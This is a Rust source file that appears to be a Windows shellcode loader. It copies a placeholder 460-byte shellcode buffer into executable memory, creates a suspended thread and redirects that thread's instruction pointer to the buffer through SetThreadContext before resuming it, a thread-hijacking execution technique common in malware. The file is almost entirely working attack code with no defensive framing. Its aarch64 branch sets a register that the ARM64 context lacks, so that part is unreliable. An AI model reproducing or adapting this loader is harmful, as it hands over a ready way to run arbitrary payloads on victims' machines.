use std::ffi::c_void;
#[cfg(target_arch = "arm")]
use windows::Win32::System::Diagnostics::Debug::CONTEXT_ALL_ARM;
#[cfg(target_arch = "aarch64")]
use windows::Win32::System::Diagnostics::Debug::CONTEXT_ALL_ARM64;
#[cfg(target_arch = "x86")]
use windows::Win32::System::Diagnostics::Debug::CONTEXT_ALL_X86;
#[cfg(target_arch = "x86_64")]
use windows::Win32::System::Diagnostics::Debug::{CONTEXT_ALL_AMD64, CONTEXT_FLAGS};
use windows::{
    Win32::{
        Foundation::{CloseHandle, GetLastError},
        System::{
            Diagnostics::Debug::{CONTEXT, GetThreadContext, SetThreadContext, WriteProcessMemory},
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc},
            Threading::{
                CREATE_SUSPENDED, CreateThread, GetCurrentProcess, INFINITE, ResumeThread, Sleep,
                THREAD_CREATION_FLAGS, WaitForSingleObject,
            },
        },
    },
    core::{Error, HRESULT, Result},
};

#[cfg(target_arch = "x86_64")]
const CONTEXT_ALL: CONTEXT_FLAGS = CONTEXT_ALL_AMD64;
#[cfg(target_arch = "x86")]
const CONTEXT_ALL: CONTEXT_FLAGS = CONTEXT_ALL_X86;
#[cfg(target_arch = "arm")]
const CONTEXT_ALL: CONTEXT_FLAGS = CONTEXT_ALL_ARM;
#[cfg(target_arch = "aarch64")]
const CONTEXT_ALL: CONTEXT_FLAGS = CONTEXT_ALL_ARM64;

fn main() -> Result<()> {
    let shellcode: [u8; 460] = [0x00; 460];

    unsafe {
        let h_memory = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if h_memory.is_null() {
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let mut bytes_written: usize = 0;
        WriteProcessMemory(
            GetCurrentProcess(),
            h_memory,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut bytes_written),
        )?;

        let mut thread_id: u32 = 0;
        let h_thread = CreateThread(
            None,
            0,
            Some(dummy),
            None,
            THREAD_CREATION_FLAGS(CREATE_SUSPENDED.0),
            Some(&mut thread_id),
        )?;

        Sleep(5_000);

        let mut ctx = CONTEXT::default();
        ctx.ContextFlags = CONTEXT_ALL;
        GetThreadContext(h_thread, &mut ctx)?;

        #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
        {
            ctx.Rip = h_memory as u64;
        }

        #[cfg(target_arch = "x86")]
        {
            ctx.Eip = h_memory as u32;
        }

        #[cfg(target_arch = "arm")]
        {
            ctx.Pc = h_memory as u32;
        }

        SetThreadContext(h_thread, &ctx)?;
        ResumeThread(h_thread);

        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread)?;
    };

    Ok(())
}

extern "system" fn dummy(_param: *mut c_void) -> u32 {
    0
}
